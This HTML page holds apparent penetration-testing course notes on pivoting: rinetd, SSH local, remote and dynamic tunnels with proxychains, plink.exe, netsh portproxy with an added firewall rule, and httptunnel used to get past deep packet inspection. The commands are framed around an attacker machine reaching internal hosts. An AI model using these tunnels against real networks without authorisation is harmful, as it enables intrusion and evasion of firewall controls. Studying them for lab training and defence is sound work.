<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Port redirection and tuneling</title>
</head><body>Port forwarding with RINETD:<ul><li style="list-style-type: none">sudo apt-get install rinetd</li>
<li style="list-style-type: none">sudo nano /etc/rinetd.conf</li>
<li style="list-style-type: none">Add the forwarding rules to redirect all incoming traffic on port 80 to google.com (IP 216.58.207.142) on port 80: 0.0.0.0 80 216.58.207.142 80</li>
<li style="list-style-type: none">sudo service rinetd restart</li>
<li style="list-style-type: none">ss -antp | grep "80"</li>
</ul>
SSH tunneling:<ul><li style="list-style-type: none">SSH can create encrypted tunnels</li>
<li style="list-style-type: none">SSH local port forwarding: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">It allows to tunnel a local port to a remote server using SSH as transport protocol, similarly to RINETD, with few twists</li>
<li style="list-style-type: none">On kali attacker machine: sudo ssh -N -L &nbsp;[bind_address:]port:host:hostport [username@address]</li>
<li style="list-style-type: none">On kali attacker machine: sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</li>
<li style="list-style-type: none">On kali attacker machine: smbclient -L 127.0.0.1 -U Administrator</li>
</ul>
</li>
<li style="list-style-type: none">SSH remote port forwarding:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">It is the reverse of local port forwarding, because a port is open on the remote side of the connection and traffic sent to that port is forwarded to a port on our local attacker machine, where we run ssh command</li>
<li style="list-style-type: none">On the debian client: sudo ssh -N -R [bind_address:]port:host:hostport [username@address]</li>
<li style="list-style-type: none">On the debian client: sudo ssh -N -R 10.11.0.4:2221:127.0.0.1:3396 kali@10.11.0.4</li>
<li style="list-style-type: none">On kali attacker machine: ss -antp | grep "2221"</li>
<li style="list-style-type: none">On kali attacker machine: sudo nmap -sS -sV 127.0.0.1 -p 2221</li>
</ul>
</li>
<li style="list-style-type: none">SSH dynamic port forwarding:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">it allows us to set a local listening port and have it tunnel incoming traffic to any remote destination thru the use of a proxy</li>
<li style="list-style-type: none">On kali attacker machine: ssh -N -D &lt;address to bind to&gt;:&lt;port to bind to&gt; &lt;username&gt;@&lt;SSH server address&gt;</li>
<li style="list-style-type: none">On kali attacker machine: sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128</li>
<li style="list-style-type: none">This basically creates a socks4 proxy on port 8080. To have our kali tools use this proxy, we can use proxychains and edit its config file</li>
<li style="list-style-type: none">sudo nano /etc/proxychains.conf</li>
<li style="list-style-type: none">We add our socks4 proxy to the config file: socks4 127.0.0.1 8080</li>
<li style="list-style-type: none">Then, we can run our tools thru this proxy, we prepend our commands with proxychains, for example: proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110</li>
</ul>
</li>
</ul>
PLINK.exe:<ul><li style="list-style-type: none">It is used to pivoting thru Windows operating systems (we need a System level shell). For example, we can exploit the SyncBreeze buffer overflow and gain System level access to the Windows machine. After enumerating the machine, we find a MySQL server running on the machine, but we cannot interact with it directly from our attacker kali machine because the firewall blocks port 3306</li>
<li style="list-style-type: none">PLINK.exe is a Windows-based command line SSH client</li>
<li style="list-style-type: none">To establish remote port forwarding: cmd.exe /c echo y | plink.exe -ssh-l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</li>
</ul>
NETSH:<ul><li style="list-style-type: none">netsh can be used on a Windows system (for example our Windows client), where there is the IP Helper service running and the network interface has IPv6 support enabled. Fortunately both are enabled by default on Windows. We can then use netsh to forward the SMB port 445 of a Windows server in the internal network to the port 4455 of the Windows client, so that we can then access with it from our attacker kali machine</li>
<li style="list-style-type: none">netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110</li>
<li style="list-style-type: none">To verify the new listening port: netstat -ant TCP | find "4455"</li>
<li style="list-style-type: none">To add a firewall rule and allow incoming traffic on port 4455, being 455 blocked by default by the firewall: netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow</li>
<li style="list-style-type: none">To test the port forwarding: smbclient -L 10.11.0.22 --port=4455 --user=Administrator</li>
<li style="list-style-type: none">Finally we can mount the share of the internal Windows server:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">sudo mkdir /mnt/win10_share</li>
<li style="list-style-type: none">sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share</li>
</ul>
</li>
</ul>
HTTPTunneling through deep packet inspection:<ul><li style="list-style-type: none">httptunnel is an tool useful in environments where some protocols are not allowed, for example environments where SSH is not allowed and where all SSH-based tunnels will not work. For example, we want to establish a RDP connection between our attacker kali machine and the Windows server in the internal network, via the debian client and with the firewall that only allows ports 80, 443 and 1234</li>
<li style="list-style-type: none"><img src="httptunneling through deep packet inspec 2.png" /></li>
<li style="list-style-type: none">httptunnel works on a client-server based way (hts being the server and htc the client components) and needs to be installed in kali: sudo apt update &amp;&amp; sudo apt install httptunnel</li>
<li style="list-style-type: none">From the debian client: ssh -L 0.0.0.0:8888:192.168.1.110:3389student@127.0.0.1</li>
<li style="list-style-type: none">Then we setup the httptunnel server on the debian client: hts --forward-port localhost:8888 1234</li>
<li style="list-style-type: none">Finally we setup the httptunnel client on our attacker kali machine: htc --forward-port 8080 10.11.0.128:1234</li>
<li style="list-style-type: none">At this point we can launch the RDP client against port 8080 of the kali machine and connect, thru the HTTP tunnel, bypassing firewall restrictions and using the ssh local port forwarding of the debian machine, to our final target that is the Windows server: rdesktop 127.0.0.1:8080</li>
<li style="list-style-type: none"></li>
</ul>
<br/>
<br/>
</body></html>